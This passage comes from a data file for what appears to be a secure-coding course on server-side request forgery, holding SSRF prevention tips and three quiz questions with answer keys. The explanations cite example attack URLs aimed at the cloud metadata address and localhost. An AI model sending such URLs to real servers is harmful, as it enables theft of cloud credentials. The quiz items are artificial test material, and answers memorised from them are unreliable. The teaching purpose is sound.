        'Enforce AWS IMDSv2 (session token requirement with hop limit = 1) across all cloud compute.',
        'Do not send raw response bodies from fetched URLs directly back to the client.',
      ],
    },
    quiz: [
      {
        id: 'a10-q1',
        question: 'What is the primary danger of an SSRF vulnerability in a modern cloud environment (AWS, GCP, Azure)?',
        options: [
          'It changes the cloud provider’s billing currency.',
          'Attackers can target the internal cloud metadata service (169.254.169.254) to steal IAM credentials and take over the entire cloud infrastructure.',
          'It turns off dark mode on the server.',
          'It slows down internet connection speeds for mobile users.',
        ],
        correctAnswer: 1,
        explanation:
          'Cloud platforms host a local metadata service at link-local IP 169.254.169.254. If an attacker can force the server to query this address, it can return secret temporary IAM credentials that allow full administrative control over cloud resources.',
      },
      {
        id: 'a10-q2',
        question: 'Why is checking if a URL starts with "http://" or "https://" NOT enough to prevent SSRF?',
        options: [
          'Because HTTP is not an encrypted protocol.',
          'Because an attacker can still input "http://127.0.0.1/admin" or "http://169.254.169.254" which uses valid HTTP syntax to attack internal systems.',
          'Because HTTPS certificates are free.',
          'Because modern web browsers do not support URL prefixes.',
        ],
        correctAnswer: 1,
        explanation:
          'A malicious URL like http://169.254.169.254 or http://localhost:8080 is a completely valid HTTP URL. Simply checking the scheme does nothing to stop the server from connecting to internal private network targets.',
      },
      {
        id: 'a10-q3',
        question: 'How does AWS IMDSv2 mitigate SSRF attacks against cloud metadata?',
        options: [
          'It encrypts the hard drive with BitLocker.',
          'It requires a session token obtained via an HTTP PUT request with custom headers, which typical blind SSRF vectors cannot produce.',
          'It requires users to enter a fingerprint before accessing the website.',
          'It shuts down the server whenever an error occurs.',
        ],
        correctAnswer: 1,
        explanation:
          'IMDSv2 requires clients to first acquire a session token using an HTTP PUT request with an "X-aws-ec2-metadata-token-ttl-seconds" header. Most SSRF vulnerabilities can only perform simple GET requests without custom headers, defeating the exploit.',
      },
    ],
  },
];
